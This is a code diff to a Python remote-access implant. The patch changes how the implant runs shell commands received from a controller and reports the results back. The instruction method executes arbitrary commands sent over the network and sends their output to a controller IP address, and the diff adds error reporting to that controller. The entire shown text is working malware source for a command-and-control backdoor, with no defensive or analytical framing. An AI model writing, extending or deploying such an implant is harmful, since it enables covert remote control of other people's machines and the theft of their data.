@@ -47,20 +47,26 @@ class Implant(Host):
             out, err = proc.communicate()
             return out,err
         else:
-            return None
+            return None, "Timeout expired"
 
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
-            out,err = self.run(cmd, 3)
-            print(out)
-            print(err)
-            self.send(self.controller_ip, "instruction", out)
+            stdout, stderr = self.run(cmd, 3)
+            if 'not found' in stderr:
+                raise FileNotFoundError
+            elif "Syntax error" in stderr:
+                raise SyntaxError
+            elif "Timeout expired" in stderr:
+                raise TimeoutExpired
+            self.send(self.controller_ip, "instruction", stdout)
             
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
         except FileNotFoundError:
-            self.send(self.controller_ip, "instruction", f"The command {cmd[0]} has not been found".encode(), option="ERROR")
+            self.send(self.controller_ip, "instruction", f"The command {cmd.split(" ")[0]} has not been found".encode(), option="ERROR")
+        except SyntaxError:
+            self.send(self.controller_ip, "instruction", b'There was a syntax error in the command', option="ERROR")
 
 if __name__ == "__main__":
     print("[ Setting up implant... ]")
